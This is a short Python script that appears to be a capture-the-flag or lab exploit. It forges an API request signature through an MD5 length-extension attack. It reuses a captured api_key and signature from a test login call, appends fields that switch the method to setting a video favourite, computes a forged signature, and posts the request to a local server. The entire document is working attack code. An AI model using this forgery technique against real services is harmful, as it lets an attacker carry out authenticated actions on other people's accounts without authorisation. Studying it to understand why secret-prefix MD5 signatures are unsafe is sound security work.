import requests
import md5

url = "http://localhost:4242/api"

data = {
    'method': 'vimeo.test.login',
    'api_key': raw_input("api_key: "),
    'api_sig': raw_input("api_sig: "),
}

# save current info in data
data['a'] = 'pi_key'+data['api_key']+'method'+data['method']

# craft the packet we want
data['video_id'] = '1337'
data['favorite'] = '1'
data['method'] = 'vimeo.videos.setFavorite'

bad_md5 = md5.MD5(data['api_sig']+'api_key'+data['api_key']+'favorite'+data['favorite']+'method'+data['method']+'video_id'+data['video_id'])
data['api_sig'] = bad_md5.hexdigest()

print data

r = requests.post(url, data=data)
print r.text
